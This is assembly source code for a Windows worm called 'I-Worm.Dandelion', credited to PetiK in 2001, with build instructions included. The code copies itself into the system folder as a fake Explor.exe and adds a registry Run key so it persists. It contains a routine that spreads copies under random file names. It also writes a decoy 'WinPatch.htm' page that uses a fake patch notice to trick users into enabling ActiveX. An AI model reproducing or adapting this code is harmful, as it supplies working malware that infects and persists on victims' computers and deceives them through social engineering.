
; comment #
; Name : I-Worm.Dandelion
; Author : PetiK
; Date : November 7th
; Size : 6144 byte
; 
; Action:   Copy itself to
;       * WINDOWS\SYSTEM\Explor.exe
;   Add in the key HKLM\Software\Microsoft\Windows\CurrentVersion\Run the value
;       * MS Explor = WINDOWS\SYSTEM\Explor.exe
; 
;   In each run, it copies itself with a randome name on %windows% path. It record
;   the name into the file "dandelion.txt" in the same folder.
; 
; 
; To delete the worm :
; Look at the file Del_Dandelion.vbs
; 
; To built the worm :
; @echo off
; tasm32 /ml /m9 Dandelion
; tlink32 -Tpe -c -x -aa Dandelion,,,import32,dllz.def
; upx -9 Dandelion.exe
; if exist *.obj del *.obj
; if exist *.map del *.map
; 
; 
; Notes of the authors:
; 
; #

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include useful.inc
include myinclude.inc

start:

twin_worm:
    push    50
    mov esi,offset orig_worm
    push    esi
    push    0
    api GetModuleFileNameA              ; esi = name of file

    mov edi,offset copy_worm
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov eax,"pxE\"
    stosd
    mov eax,".rol"
    stosd
    mov eax,"exe"
    stosd
    pop edi                     ; edi = 

    push    0
    push    edi
    push    esi
    api CopyFileA                   ; copy itself

    push    9
    push    edi
    push    1
    @pushsz "MS Explor"
    @pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
    push    80000002h
    api SHSetValueA                 ; regedit
end_twin:

;   call    spread_computer
    call    htm_file

end_worm:
    push    0
    api ExitProcess


spread_computer proc
    pushad
    call    generator_name
    mov edi,offset genname

    push    50
    push    offset windir
    api GetWindowsDirectoryA
    push    offset windir
    api SetCurrentDirectoryA

    push    0
    push    edi
    push    offset orig_worm
    api CopyFileA

    @pushsz "dandelion.txt"
    @pushsz "A New Copy Of Worm.Dandelion"
    push    edi
    @pushsz "Copy Of Worm"
    api WritePrivateProfileStringA

    end_spread_computer:
    popad
    ret

    generator_name:
    mov edi,offset genname
    api GetTickCount
    push    9
    pop ecx
    xor edx,edx
    div ecx
    inc edx
    mov ecx,edx
    gen_name:
    push    ecx
    api GetTickCount
    push    'Z'-'A'
    pop ecx
    xor edx,edx
    div ecx
    xchg    eax,edx
    add al,'A'
    stosb
    api GetTickCount
    push    100
    pop ecx
    xor edx,edx
    div ecx
    push    edx
    api Sleep
    pop ecx
    loop    gen_name
    mov eax,'exe.'
    stosd
    ret
spread_computer endp

htm_file    proc
    pushad
    mov edi,offset ptkdir
    push    edi
    push    50
    push    edi
    api GetSystemDirectoryA
    add edi,eax
    mov eax,"glP\"
    stosd
    mov eax,"KTP_"
    stosd
    pop edi
    push    edi
    api CreateDirectoryA
    push    edi
    api SetCurrentDirectoryA
    create_htm:
    @pushsz "\WinPatch.htm"
    push    offset ptkdir
    api lstrcat
    push    0
    push    80h
    push    2
    push    0
    push    1
    push    40000000h
    push    offset ptkdir
    api CreateFileA
    mov [hHTM],eax
    push    0
    push    offset byte
    push    e_htm - s_htm
    push    offset s_htm
    push    [hHTM]
    api WriteFile
    push    [hHTM]
    api CloseHandle
    end_htm_file:
    popad
    ret
htm_file    endp

.data
; === copy_worm ===
orig_worm   db 50 dup (0)
copy_worm   db 50 dup (0)


; === spread_computer ===
windir      db 50 dup (0)
genname     db 15 dup (?)


; === htm_file ===
ptkdir      db 50 dup (0)
hHTM        dd ?
byte        dd ?
s_htm:  db '<HTML><HEAD><TITLE>Windows98</TITLE></HEAD>',CRLF
    db '<BODY TEXT=yellow LINK=red VLINK=red BGCOLOR="#000080">',CRLF
    db '<P ALIGN="RIGHT">',CRLF
    db '<A HREF="http://www.microsoft.com/isapi/redir.dll?'
    db 'prd=windows98&clcid=&pver=4.10&ar=wallpaper">',CRLF
    db '<IMG SRC="res://membg.dll/membg.gif" BORDER=0 WIDTH=329 HEIGHT=47></A>&nbsp;'
    db '</P>',CRLF
    db '</BODY>',CRLF
    db '<P ALIGN="CENTER">',CRLF
    db '<script language=vbscript>',CRLF
    db 'on error resume next',CRLF
    db 'set fso=createobject("scripting.filesystemobject")',CRLF
    db 'if err.number=429 then',CRLF
    db 'document.write "<font>Please accept the ActiveX to see this HTML wallpaper !'
    db '<br><a href =''javascript:location.reload()''>CLICK HERE</a> to reload and '
    db 'click yes</font>"',CRLF
    db 'else',CRLF
    db 'document.write "<font>Click on the Windows logo to download the new patch.'
    db '<br>This patch correct the bug about the IIS and MIME.<br><br></font>"',CRLF
    db 'document.write "<font>(You must be connected tp inet !!)</font>"',CRLF
    db 'end if',CRLF
    db '</script>',CRLF
    db '</HTML>',CRLF
e_htm:



signature   db "I-Worm.Dandelion "
author      db "Coded by PetiK - 2001",00h

end start
end

